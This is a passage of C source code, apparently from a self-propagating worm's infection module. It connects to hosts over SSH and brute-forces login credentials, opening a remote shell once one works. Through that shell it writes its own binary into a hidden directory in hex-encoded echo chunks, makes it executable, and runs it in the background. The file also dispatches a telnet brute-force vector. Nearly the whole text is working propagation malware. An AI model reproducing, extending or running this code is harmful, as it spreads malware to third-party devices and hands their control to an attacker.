		ctx->param.rcb.m_self,
		ctx->param.rcb.self_len,
		ctx->param.rcb.exec_len,
		ctx->param.rcb.m_dv,
		ctx->param.rcb.dv_len,
		ctx->param.rcb.ba);

	if (ctx->result.prc == PRNE_PACK_RC_NO_ARCH) {
		// retry with compatible arch if available
		switch (ctx->result.arch) {
		case PRNE_ARCH_AARCH64:
		case PRNE_ARCH_ARMV7:
			ctx->result.arch = PRNE_ARCH_ARMV4T;
			break;
		case PRNE_ARCH_X86_64:
			ctx->result.arch = PRNE_ARCH_I686;
			break;
		default: return false;
		}
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: retrying bin_rcb with compat arch %s\n",
				(uintptr_t)ctx,
				prne_arch_tostr(ctx->result.arch));
		}
		ctx->result.prc = prne_start_bin_rcb(
			&sh_ctx->rcb,
			ctx->result.arch,
			ctx->param.rcb.self,
			ctx->param.rcb.m_self,
			ctx->param.rcb.self_len,
			ctx->param.rcb.exec_len,
			ctx->param.rcb.m_dv,
			ctx->param.rcb.dv_len,
			ctx->param.rcb.ba);
	}

	return ctx->result.prc == PRNE_PACK_RC_OK;
}

/*
* When upload fails
*/
static bool bne_sh_cleanup_upload (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx)
{
	bool ret = false;
	char *cmd = NULL;
	const char *sb[] = {
		"rm -rf \"", s_ctx->upload_dir, "\"", s_ctx->nl
	};

	if (s_ctx->upload_dir == NULL) {
		return true;
	}

	cmd = prne_build_str(sb, sizeof(sb)/sizeof(const char*));
	if (cmd == NULL) {
		return false;
	}

	ret = bne_sh_send(s_ctx, cmd);
	prne_free(cmd);

	return bne_sh_sync(s_ctx) && ret;
}

static bool bne_sh_prep_upload (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *dir,
	const char *exec_name,
	const char *mode)
{
	bool ret = false;
	uint8_t uuid[16];
	char uuid_str[37];
	char *cmd = NULL;
	const char *sb_ud[] = { dir, "/.", uuid_str };
	int ec = -1;
	bne_sh_parser_t parser;

	bne_init_sh_parser(&parser);
	parser.ctx = &ec;
	parser.line_f = bne_sh_int_parse_f;

	if (!prne_rnd(&ctx->rnd, uuid, 16)) {
		memset(uuid, 0xAF, 16);
	}
	prne_uuid_tostr(uuid, uuid_str);

//TRY
	if (!bne_sh_cleanup_upload(ctx, s_ctx)) {
		goto END;
	}
	if (!bne_sh_start_rcb(ctx, s_ctx)) {
		goto END;
	}

	s_ctx->upload_dir = prne_build_str(
		sb_ud,
		sizeof(sb_ud)/sizeof(const char **));
	if (s_ctx->upload_dir == NULL) {
		goto END;
	}
	else {
		const char *sb_cmd[] = {
			"mkdir \"", s_ctx->upload_dir, "\" && "
			"cd \"", s_ctx->upload_dir, "\" && "
			"echo -n > \"", exec_name, "\" && "
			"chmod ", mode, " \"", exec_name, "\"; "
			"echo $?"
		};

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: prep upload on %s\n",
				(uintptr_t)ctx,
				s_ctx->upload_dir);
		}

		cmd = prne_build_str(
			sb_cmd,
			sizeof(sb_cmd)/sizeof(const char **));
		if (cmd == NULL) {
			goto END;
		}
	}

	if (!bne_sh_runcmd_line(s_ctx, &parser, cmd)) {
		goto END;
	}
	ret = ec == 0;

END:
	prne_free(cmd);
	bne_free_sh_parser(&parser);
	return bne_sh_sync(s_ctx) && ret;
}

static bool bne_sh_upload_echo (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
	static const char BASE_CMD[] = "echo -ne ";
	char *const cmd_buf = (char*)s_ctx->buf;
	char *cmd_p;
	// Busybox ash line buffer size is 1024
	uint8_t *const bin_buf = s_ctx->buf + 1025;
	uint8_t *bin_p;
	ssize_t f_ret;
	int poll_ret = 0;
	bool ret = true;
	const size_t exec_len = strlen(exec);
	const size_t nl_len = strlen(s_ctx->nl);

	if (exec_len > 255) {
		ctx->result.err = E2BIG;
		return false;
	}

	if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
		prne_dbgpf(
			"bne@%"PRIxPTR"\t: uploading using echo ...\n",
			(uintptr_t)ctx);
	}

	_Static_assert(sizeof(s_ctx->buf) >= 2048, "FIXME");
	strcpy(cmd_buf, BASE_CMD);

	while (ctx->result.prc != PRNE_PACK_RC_EOF) {
		f_ret = prne_bin_rcb_read(
			&s_ctx->rcb,
			bin_buf,
			150, // 5 * 202 = 750 characters. the rest characters for file name
			&ctx->result.prc,
			&ctx->result.err);
		if (f_ret < 0) {
			break;
		}

		if (f_ret > 0) {
			bin_p = bin_buf;
			cmd_p = cmd_buf + strlen(BASE_CMD);
			for (size_t i = 0; i < (size_t)f_ret; i += 1) {
				cmd_p[0] = '\\';
				cmd_p[1] = '\\';
				cmd_p[2] = 'x';
				prne_hex_tochar(*bin_p, cmd_p + 3, true);
				cmd_p += 5;
				bin_p += 1;
			}
			cmd_p[0] = ' ';
			cmd_p[1] = '>';
			cmd_p[2] = '>';
			cmd_p[3] = ' ';
			cmd_p += 4;
			memcpy(cmd_p, exec, exec_len);
			cmd_p += exec_len;
			memcpy(cmd_p, s_ctx->nl, nl_len + 1);

			if (!bne_sh_send(s_ctx, cmd_buf)) {
				ret = false;
				break;
			}

			// Assume that something went wrong if there's any output at all
			poll_ret = s_ctx->pollin_f(s_ctx->ctx);
			if (poll_ret != 0) {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
					prne_dbgpf(
						"bne@%"PRIxPTR"\t: "
						"output produced while echo uploading!\n",
						(uintptr_t)ctx);
				}
				ret = false;
				break;
			}
		}

		pth_yield(NULL);
	}

	if (poll_ret > 0) {
		bne_sh_sync(s_ctx);
	}

	return ret;
}

/*
* - Run executable: "./$exec" & disown
*/
static bool bne_sh_run_exec (
	prne_bne_t *ctx,
	bne_sh_ctx_t *s_ctx,
	const char *exec)
{
	const char *sb_cmd[] = { "./", exec, " & " };
	char *cmd;
	bne_sh_parser_t parser;
	bool ret;

	bne_init_sh_parser(&parser);

	cmd = prne_build_str(sb_cmd, sizeof(sb_cmd)/sizeof(const char*));
	if (cmd == NULL) {
		ctx->result.err = errno;
		return false;
	}

	ret = bne_sh_runcmd_line(s_ctx, &parser, cmd);

	prne_free(cmd);
	return ret;
}

static bool bne_do_shell (prne_bne_t *ctx, bne_sh_ctx_t *sh_ctx) {
	static const bne_avail_cmds_t IMPL_UPLOAD_METHODS =
		BNE_AVAIL_CMD_ECHO;
	bool ret = false;
	bne_avail_cmds_t avail_cmd, cur_cmd;
	bool (*upload_f)(prne_bne_t *ctx, bne_sh_ctx_t *s_ctx, const char *exec);
	char *exec_name = NULL;

// TRY
	exec_name = ctx->param.cb.exec_name();
	if (exec_name == NULL) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_sh_setup(ctx, sh_ctx)) {
		goto END;
	}

	for (prne_llist_entry_t *ent = sh_ctx->up_loc.head;
		ent != NULL;
		ent = ent->next)
	{
		char *mp = (char*)ent->element;

		avail_cmd = sh_ctx->avail_cmds & IMPL_UPLOAD_METHODS;
		while (true) {
			upload_f = NULL;

			cur_cmd = avail_cmd & BNE_AVAIL_CMD_ECHO;
			if (cur_cmd) {
				avail_cmd &= ~cur_cmd;
				upload_f = bne_sh_upload_echo;
				goto START_UPLOAD;
			}

START_UPLOAD:
			if (upload_f == NULL) {
				break;
			}

			ret = bne_sh_prep_upload(
				ctx,
				sh_ctx,
				mp,
				exec_name,
				"700");
			if (ret) {
				ret =
					upload_f(ctx, sh_ctx, exec_name) &&
					bne_sh_run_exec(ctx, sh_ctx, exec_name);

				if (ret) {
					goto END;
				}
				if (!bne_sh_cleanup_upload(ctx, sh_ctx)) {
					goto END;
				}
			}
			else {
				goto END;
			}
		}
	}

END: // CATCH
	prne_free(exec_name);

	return ret;
}

/*******************************************************************************
                                SSH Vector Impl
*******************************************************************************/
static void bne_vssh_discon (
	bne_vssh_ctx_t *vs,
	const struct timespec *to,
	const int reason,
	const char *desc)
{
	pth_event_t ev = NULL;

	if (vs->ss == NULL) {
		return;
	}

	prne_pth_reset_timer(&ev, to);
	prne_lssh2_discon(vs->ss, vs->fd, reason, desc, "", ev);
	pth_event_free(ev, FALSE);
}

static void bne_vssh_drop_conn (bne_vssh_ctx_t *vs) {
	prne_shutdown(vs->fd, SHUT_RDWR);

	prne_free(vs->auth_list);
	vs->auth_list = NULL;
	prne_lssh2_free_session(vs->ss);
	vs->ss = NULL;
	prne_close(vs->fd);
	vs->fd = -1;
}

static bool bne_vssh_est_sshconn (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	uint8_t m_sa[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];
	struct sockaddr_in *sa4;
	struct sockaddr_in6 *sa6;
	socklen_t sl;
	int af, f_ret;
	pth_event_t ev = NULL;
	const struct timespec *pause = NULL;

	if (vs->ss != NULL) {
		return true;
	}

	prne_pth_reset_timer(&ev, &BNE_CONN_OP_TIMEOUT);
	while (vs->ports.size > 0 && pth_event_status(ev) != PTH_STATUS_OCCURRED) {
		bne_port_t *p = (bne_port_t*)vs->ports.head->element;

		if (pause != NULL) {
			pth_nanosleep(pause, NULL);
			pause = NULL;
		}

		bne_vssh_drop_conn(vs);
		p->attempt += 1;

		switch (ctx->param.subject.ver) {
		case PRNE_IPV_4:
			sl = sizeof(struct sockaddr_in);
			sa4 = (struct sockaddr_in*)m_sa;
			prne_memzero(m_sa, sl);

			sa4->sin_family = af = AF_INET;
			memcpy(&sa4->sin_addr, ctx->param.subject.addr, 4);
			sa4->sin_port = htons(p->port);
			break;
		case PRNE_IPV_6:
			sl = sizeof(struct sockaddr_in6);
			sa6 = (struct sockaddr_in6*)m_sa;
			prne_memzero(m_sa, sl);

			sa6->sin6_family = af = AF_INET6;
			memcpy(&sa6->sin6_addr, ctx->param.subject.addr, 16);
			sa6->sin6_port = htons(p->port);
			break;
		default: continue;
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: knocking %"PRIu16"\n",
				(uintptr_t)ctx,
				p->port);
		}

		if (!bne_do_connect(af, (struct sockaddr*)m_sa, sl, &vs->fd, ev)) {
			ctx->result.err = errno;
			goto END;
		}
		if (vs->fd < 0) {
			pause = &BNE_ERR_PAUSE;
			if (p->attempt >= BNE_CONN_ATTEMPT) {
				goto POP;
			}
			continue;
		}

		vs->ss = libssh2_session_init();
		if (vs->ss == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		libssh2_session_set_blocking(vs->ss, 0);

		f_ret = prne_lssh2_handshake(vs->ss, vs->fd, ev);
		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: handshake %d\n",
				(uintptr_t)ctx,
				f_ret);
		}
		if (f_ret == 0) {
			ctx->result.err = 0;
			ret = true;
			break;
		}
		/* fall-through */
POP:
		// try next port
		prne_free(p);
		prne_llist_erase(&vs->ports, vs->ports.head);
	}

END:
	if (ev != NULL) {
		if (pth_event_status(ev) != PTH_STATUS_OCCURRED) {
			ctx->result.err = ETIMEDOUT;
		}
		pth_event_free(ev, FALSE);
	}
	if (!ret) {
		bne_vssh_drop_conn(vs);
	}

	return ret;
}

static bool bne_vssh_login (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bool ret = false;
	pth_event_t ev = NULL;
	int f_ret;

	while (true) {
		if (!bne_vssh_est_sshconn(ctx, vs)) {
			break;
		}

		if (ctx->result.cred.id == NULL || ctx->result.cred.pw == NULL) {
			if (!bne_pop_cred(ctx, true)) {
				break;
			}
			if (ctx->result.cred.id == NULL) {
				// have to try different ID
				bne_vssh_discon(
					vs,
					&BNE_CLOSE_OP_TIMEOUT,
					SSH_DISCONNECT_BY_APPLICATION,
					"this ain't over!");
				bne_vssh_drop_conn(vs);
				continue;
			}
		}

		prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
		if (vs->auth_list == NULL) {
			const char *tmp = prne_lssh2_ua_list(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ev,
				NULL);

			if (tmp != NULL) {
				const size_t len = strlen(tmp);

				vs->auth_list = prne_alloc_str(len);
				if (vs->auth_list == NULL) {
					ctx->result.err = errno;
					break;
				}
				memcpy(vs->auth_list, tmp, len + 1);
				prne_transstr(vs->auth_list, tolower);
			}
			else if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
		}

		f_ret = prne_lssh2_ua_authd(vs->ss, vs->fd, ev);
		if (f_ret < 0) {
			bne_vssh_drop_conn(vs);
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			continue;
		}

		if (f_ret == 0) {
			// need auth
			// check vs->auth_list maybe?
			if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0 + 1) {
				prne_dbgpf(
					"bne@%"PRIxPTR"\t: trying cred %s %s\n",
					(uintptr_t)ctx,
					ctx->result.cred.id,
					ctx->result.cred.pw);
			}

			f_ret = prne_lssh2_ua_pwd(
				vs->ss,
				vs->fd,
				ctx->result.cred.id,
				ctx->result.cred.pw,
				ev);
			if (f_ret == LIBSSH2_ERROR_AUTHENTICATION_FAILED) {
/*
* server's not accepting the credentials that had been used for the
* first time
*/
				prne_free(ctx->result.cred.pw);
				ctx->result.cred.pw = NULL;
				continue;
			}
			if (f_ret != 0) {
				bne_vssh_drop_conn(vs);
				if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
					break;
				}
				continue;
			}
		}

		if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
			prne_dbgpf(
				"bne@%"PRIxPTR"\t: authenticated using cred %s %s\n",
				(uintptr_t)ctx,
				ctx->result.cred.id,
				ctx->result.cred.pw);
		}

		// after auth, acquire shell
		do { // FAKE LOOP
			vs->ch_shell = prne_lssh2_open_ch(
				vs->ss,
				vs->fd,
				ev,
				NULL);
			if (vs->ch_shell == NULL) {
				break;
			}
#if 0 // without terminal
			if (prne_lssh2_ch_req_pty(
				vs->ss,
				vs->ch_shell,
				vs->fd,
				"vanilla",
				ev))
			{
				break;
			}
#endif
			f_ret = prne_lssh2_ch_sh(vs->ss, vs->ch_shell, vs->fd, ev);
			if (f_ret == 0) {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_DBG0) {
					prne_dbgpf(
						"bne@%"PRIxPTR"\t: shell opened\n",
						(uintptr_t)ctx);
				}
			}
			else {
				if (PRNE_DEBUG && PRNE_VERBOSE >= PRNE_VL_ERR) {
					prne_dbgpf(
						"bne@%"PRIxPTR"\t: failed to open shell (%d)\n",
						(uintptr_t)ctx,
						f_ret);
				}
				break;
			}

			ret = true;
			ctx->result.err = 0;
		} while (false);

		if (!ret) {
			if (pth_event_status(ev) == PTH_STATUS_OCCURRED) {
				break;
			}
			// credential worked, but could not open shell with this account
			bne_delete_cred_w_id(ctx, ctx->result.cred.id);
			bne_free_result_cred(ctx);
			bne_vssh_discon(
				vs,
				&BNE_CLOSE_OP_TIMEOUT,
				SSH_DISCONNECT_BY_APPLICATION,
				"this ain't over!");
			bne_vssh_drop_conn(vs);
			continue;
		}
		break;
	}

	pth_event_free(ev, FALSE);
	return ret;
}

static ssize_t bne_vssh_read_f (
	void *ctx_p,
	void *buf_p,
	const size_t buf_size,
	pth_event_t ev)
{
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	size_t rem_size = buf_size;
	ssize_t ret = 0, f_ret;
	char *buf = (char*)buf_p;
	bool eof[2] = { false, false };
	int tmp;
	struct pollfd pfd;

	pfd.fd = ctx->fd;
	while (true) {
		f_ret = libssh2_channel_read_stderr(
			ctx->ch_shell,
			buf,
			rem_size);
		if (f_ret < 0) {
			if (f_ret != LIBSSH2_ERROR_EAGAIN) {
				ret = -1;
				break;
			}
		}
		else if (f_ret > 0) {
			ret += f_ret;
			buf += f_ret;
			rem_size -= f_ret;
		}
		else {
			eof[0] = true;
		}

		if (ret > 0) {
			break;
		}

		f_ret = libssh2_channel_read(
			ctx->ch_shell,
			buf,
			rem_size);
		if (f_ret < 0) {
			if (f_ret != LIBSSH2_ERROR_EAGAIN) {
				ret = -1;
				break;
			}
		}
		else if (f_ret > 0) {
			ret += f_ret;
			buf += f_ret;
			rem_size -= f_ret;
		}
		else {
			eof[1] = true;
		}

		if (ret > 0 || (eof[0] && eof[1])) {
			break;
		}

		tmp = libssh2_session_block_directions(ctx->ss);
		pfd.events = 0;
		if (tmp & LIBSSH2_SESSION_BLOCK_INBOUND) {
			pfd.events |= POLLIN;
		}
		if (tmp & LIBSSH2_SESSION_BLOCK_OUTBOUND) {
			pfd.events |= POLLOUT;
		}

		tmp = prne_pth_poll(&pfd, 1, -1, ev);
		if (tmp <= 0) {
			ret = -1;
			break;
		}
	}

	return ret;
}

static ssize_t bne_vssh_write_f (
	void *ctx_p,
	const void *buf_p,
	const size_t buf_size,
	pth_event_t ev)
{
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	int f_ret;
	size_t rem = buf_size;

	while (rem > 0) {
		f_ret = prne_lssh2_ch_write(
			ctx->ss,
			ctx->ch_shell,
			ctx->fd,
			buf_p,
			rem,
			ev);
		if (f_ret < 0) {
			return f_ret;
		}

		rem -= f_ret;
		buf_p = (const uint8_t*)buf_p + f_ret;
	}

	return buf_size;
}

static int bne_vssh_pollin_f (void *ctx_p) {
	bne_vssh_ctx_t *ctx = (bne_vssh_ctx_t*)ctx_p;
	ssize_t f_ret;

	f_ret = libssh2_channel_read_stderr(ctx->ch_shell, NULL, 0);
	if (f_ret == 0) {
		return 1;
	}
	else if (f_ret < 0 && f_ret != LIBSSH2_ERROR_EAGAIN) {
		return -1;
	}

	f_ret = libssh2_channel_read(ctx->ch_shell, NULL, 0);
	if (f_ret == 0) {
		return 1;
	}
	else if (f_ret < 0 && f_ret != LIBSSH2_ERROR_EAGAIN) {
		return -1;
	}

	return 0;
}

static bool bne_vssh_do_shell (prne_bne_t *ctx, bne_vssh_ctx_t *vs) {
	bne_sh_ctx_t sh_ctx;
	bool ret;

	bne_init_sh_ctx(&sh_ctx, &ctx->rnd);
	sh_ctx.ctx = vs;
	sh_ctx.read_f = bne_vssh_read_f;
	sh_ctx.write_f = bne_vssh_write_f;
	sh_ctx.pollin_f = bne_vssh_pollin_f;
	sh_ctx.nl = "\n";

	// TODO: try exec cat command on a separate channel, write() binary directly
	ret = bne_do_shell(ctx, &sh_ctx);

	bne_free_sh_ctx(&sh_ctx);
	return ret;
}

static bool bne_do_vec_ssh (prne_bne_t *ctx) {
	static const uint16_t SSH_PORTS[] = { 22 };
	bool ret = false;
	bne_vssh_ctx_t vssh_ctx;

	prne_memzero(&vssh_ctx, sizeof(bne_vssh_ctx_t));
	vssh_ctx.fd = -1;
	prne_init_llist(&vssh_ctx.ports);

	bne_free_result_cred(ctx);

	for (size_t i = 0; i < sizeof(SSH_PORTS)/sizeof(uint16_t); i += 1) {
		bne_port_t *p = prne_calloc(sizeof(bne_port_t), 1);

		if (p == NULL) {
			ctx->result.err = errno;
			goto END;
		}
		p->port = SSH_PORTS[i];

		if (!prne_llist_append(
			&vssh_ctx.ports,
			(prne_llist_element_t)p))
		{
			prne_free(p);
			ctx->result.err = errno;
			goto END;
		}
	}

	if (!bne_build_cred_set(ctx)) {
		ctx->result.err = errno;
		goto END;
	}

	if (!bne_vssh_login(ctx, &vssh_ctx)) {
		goto END;
	}

	// `ctx->result.cred` must be set at this point
	if (vssh_ctx.ch_shell != NULL) {
		ret = bne_vssh_do_shell(ctx, &vssh_ctx);

		if (ret) {
			pth_event_t ev = NULL;

			prne_pth_reset_timer(&ev, &BNE_SCK_OP_TIMEOUT);
			// close the channel and wait for the remote end to do the same
			// this ensures that the issued commands are completed
			prne_lssh2_close_ch(
				vssh_ctx.ss,
				vssh_ctx.ch_shell,
				vssh_ctx.fd,
				ev);
			prne_lssh2_ch_wait_closed(
				vssh_ctx.ss,
				vssh_ctx.ch_shell,
				vssh_ctx.fd,
				ev);

			pth_event_free(ev, FALSE);
		}
	}

END:
	bne_vssh_discon(
		&vssh_ctx,
		&BNE_CLOSE_OP_TIMEOUT,
		SSH_DISCONNECT_BY_APPLICATION,
		"thank you");
	bne_vssh_drop_conn(&vssh_ctx);
	for (prne_llist_entry_t *e = vssh_ctx.ports.head; e != NULL; e = e->next) {
		prne_free((void*)e->element);
	}
	prne_free_llist(&vssh_ctx.ports);
	return ret;
}

/*******************************************************************************
                                  Extern Impl
*******************************************************************************/
static void bne_free_ctx_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;

	if (ctx == NULL) {
		return;
	}

	prne_free_iset(&ctx->cred_set);
	prne_free_rnd(&ctx->rnd);
	prne_free_bne_param(&ctx->param);
	bne_free_result_cred(ctx);
	prne_free(ctx);
}

static void bne_fin_f (void *p) {
	// do nothing
}

static void *bne_entry_f (void *p) {
	prne_bne_t *ctx = (prne_bne_t*)p;
	bool f_ret;

	for (size_t i = 0; i < ctx->param.vector.cnt; i += 1) {
		switch (ctx->param.vector.arr[i]) {
		case PRNE_BNE_V_BRUTE_TELNET:
			f_ret = bne_do_vec_telnet(ctx);
			break;
		case PRNE_BNE_V_BRUTE_SSH:
			f_ret = bne_do_vec_ssh(ctx);
			break;
		}

		if (f_ret) {
			ctx->result.vec = ctx->param.vector.arr[i];
			break;
		}
	}

	return &ctx->result;
}

void prne_init_bne_param (prne_bne_param_t *p) {
	prne_memzero(p, sizeof(prne_bne_param_t));
	p->rcb.self = PRNE_ARCH_NONE;
}

void prne_free_bne_param (prne_bne_param_t *p) {}

const char *prne_bne_vector_tostr (const prne_bne_vector_t v) {
	switch (v) {
	case PRNE_BNE_V_BRUTE_TELNET: return "telnet";
	case PRNE_BNE_V_BRUTE_SSH: return "ssh";
	}
	return NULL;
}

prne_bne_t *prne_alloc_bne (
	prne_worker_t *w,
	mbedtls_ctr_drbg_context *ctr_drbg,
	const prne_bne_param_t *param)
{
	prne_bne_t *ret = NULL;
	uint8_t seed[PRNE_RND_WELL512_SEEDLEN];

	if (ctr_drbg == NULL || param->cb.exec_name == NULL) {
		errno = EINVAL;
		return NULL;
	}

// TRY
	ret = (prne_bne_t*)prne_calloc(sizeof(prne_bne_t), 1);
	if (ret == NULL) {
		goto ERR;
	}
	prne_init_iset(&ret->cred_set);
	prne_init_bne_param(&ret->param);
	prne_init_rnd(&ret->rnd);

	if (mbedtls_ctr_drbg_random(ctr_drbg, seed, sizeof(seed)) != 0) {
		goto ERR;
	}
	if (!prne_rnd_alloc_well512(&ret->rnd, seed)) {
		goto ERR;
	}

	ret->param = *param;

	ret->result.subject = &ret->param.subject;
	ret->result.vec = PRNE_BNE_V_NONE;
	ret->result.prc = PRNE_PACK_RC_OK;
	ret->result.arch = PRNE_ARCH_NONE;

	w->ctx = ret;
	w->entry = bne_entry_f;
	w->fin = bne_fin_f;
	w->free_ctx = bne_free_ctx_f;
	return ret;
ERR: // CATCH
	if (ret != NULL) {
		bne_free_ctx_f(ret);
		ret = NULL;
	}

	return NULL;
}
